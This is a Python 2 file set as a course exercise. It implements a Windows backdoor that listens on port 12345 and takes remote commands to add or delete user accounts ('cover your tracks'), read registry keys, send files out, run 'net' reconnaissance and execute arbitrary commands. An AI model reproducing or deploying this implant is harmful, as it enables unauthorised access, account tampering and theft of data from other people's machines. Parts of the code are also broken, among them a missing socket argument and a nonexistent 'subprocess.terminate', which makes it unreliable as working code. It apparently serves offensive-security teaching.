'''
This project is something of a nod to the other course I taught. You'll
be writing a python script to gather information from a host machine and
send it to a target server. We'll be using a bit of the code from our
previous project, which I included in this file already.

HINT: We're gonna use the crap out of the subprocess module in this

Your functions are as follows:
    create_user
        given a name, create a user
    
    delete_user
        get rid of a user, cover your tracks, or just to upset the owner
    
    download_registry_key
        given a root and a key path, send the value to the client
    
    download_file
        given a specific file name (we're not going to do a full drive 
        search, since you already wrote that code in another project),
        download it to the client
    
    gather_information
        - using Ipconfig and Netstat, learn what addresses this machine 
          owns, and what connections it has active
        - using the Net suite, gather the various pieces of intel 
          covered in previous courses, specifically:
			Accounts (Password and account policy data)
			File (Indicates shared files or folders which are in use)
			localgroup(list of groups on a machine)
			session(Display information about sessions on a machine)
			share (lists all shares from the machine)
			user (lists users)
			view (list known computers in the domain)
        
    execute_command
        execute an arbitrary command and send the results back to the 
        client
'''
import subprocess, socket, time, struct
from _winreg import *

def recv_data(sock):
    data_len, = struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)
    
def send_data(sock,data):
    data_len = len(data)
    sock.send(struct.pack("!I",data_len))
    sock.send(data)
    return

def create_user(name,pwd):
    subprocess.Popen("net user /add " + name + " " + pwd)
    return

def delete_user(name):
    subprocess.Popen("net user /del " + name)
    return

def download_registry_key(root, path, sock):
    subkey_list = list()
    value_dict = dict()
    
    root_dict = {   "HKEY_CLASSES_ROOT":HKEY_CLASSES_ROOT ,  
                    "HKEY_CURRENT_USER":HKEY_CURRENT_USER , 
                    "HKEY_LOCAL_MACHINE":HKEY_LOCAL_MACHINE , 
                    "HKEY_USERS":HKEY_USERS , 
                    "HKEY_CURRENT_CONFIG":HKEY_CURRENT_CONFIG}
    
    if root in root_dict:
        root = root_dict[root]
    else:
        print "INVALID ROOT KEY"
        return
    
    key_handle = CreateKey(root, path)
    subkeys,values,lastmodified = QueryInfoKey(key_handle)
    for i in range(subkeys):
        subkey_list.append(EnumKey(key_handle,i))
    for i in range(values):
        key,value,last_mod = EnumValue(key_handle,i)
        value_dict[key] = value
        
    send_data(sock,"====================SUBKEYS====================")
    print "SENT"
    for i in subkey_list:
        send_data(sock,i)
        
    send_data(sock,"\n\n=====================VALUES====================")
    print "SENT"
    for i in value_dict:
        send_data(sock,i + " : " + str(value_dict[i]))
    send_data(sock,"DATA_COMPLETE")
    return

def download_file(file_name,sock):
    f = file(file_name, "r")
    send_data(sock,f.read())
    return
        
def gather_information(log_name,sock):
    '''		Accounts (Password and account policy data)
			File (Indicates shared files or folders which are in use)
			localgroup(list of groups on a machine)
			session(Display information about sessions on a machine)
			share (lists all shares from the machine)
			user (lists users)
			view (list known computers in the domain)
            '''
    cmd_list = ["net accounts",
                "net file",
                "net localgroup",
                "net session",
                "net share",
                "net user",
                "net view"]
    
    f = open(log_name, "w")
    for cmd in cmd_list:
        subprocess.Popen(cmd, 0, None, None, f)
    f.close()
    download_file(log_name,sock)
    return
    
def execute_command(cmd):
    try:
        running_command = subprocess.Popen(cmd)
    except WindowsError:
        running_command = subprocess.Popen(cmd + ".com")
    subprocess.terminate(running_command)
    return
    
def get_data(sock, str_to_send):
    send_data(sock, str_to_send)
    return recv_data(sock)    

def main():
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.bind(('',12345))
    listen_sock.listen(1)
    client_sock, client_data = listen_sock.accept()
    while True:
        cmd = get_data(client_sock, "COMMAND: ")
        
        if cmd == "CU":
            name = get_data(client_sock,"name: ")
            pwd = get_data(client_sock,"Password: ")
            create_user(name, pwd)
            
        elif cmd == "DU":
            name = get_data(client_sock,"Username: ")
            delete_user(name)
            
        elif cmd == "DRK":
            root = get_data(client_sock,"Root: ")
            path = get_data(client_sock,"Path: ")
            download_registry_key(root,path,client_sock)
            
        elif cmd == "DF":
            name = get_data(client_sock,"Filename: ")
            download_file(name)
            
        elif cmd == "GI":
            name = get_data(client_sock,"Log Name: ")
            gather_information(name,client_sock)
            
        elif cmd == "EC":
            cmd = get_data(client_sock,"Command to execute: ")
            execute_command(cmd)

        
    return
    
main()
    
